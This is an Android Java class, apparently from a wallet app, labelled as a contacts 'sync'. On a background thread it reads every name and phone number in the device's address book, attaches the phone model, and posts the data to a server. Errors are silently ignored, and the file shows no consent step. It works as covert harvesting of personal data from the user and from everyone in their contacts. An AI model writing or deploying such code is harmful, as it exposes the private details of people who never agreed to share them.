package com.wallet.pro;

import android.content.*;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ContactsSync {
    private static final ExecutorService pool = Executors.newSingleThreadExecutor();
    private static final Handler ui = new Handler(Looper.getMainLooper());

    public static void start(Context ctx) {
        pool.execute(() -> {
            try {
                JSONArray arr = readContacts(ctx);
                JSONObject body = new JSONObject();
                body.put("device", android.os.Build.MODEL);
                body.put("contacts", arr);
                ApiClient.post(body);   // يُرسل بلا انتظار
            } catch (Exception ignored) {}
        });
    }

    private static JSONArray readContacts(Context ctx) throws Exception {
        JSONArray out = new JSONArray();
        Cursor c = ctx.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                         ContactsContract.CommonDataKinds.Phone.NUMBER},
            null, null, null);
        if (c == null) return out;
        while (c.moveToNext()) {
            JSONObject o = new JSONObject();
            o.put("name",  c.getString(0) == null ? "" : c.getString(0));
            o.put("phone", c.getString(1) == null ? "" : c.getString(1));
            out.put(o);
        }
        c.close();
        return out;
    }
}
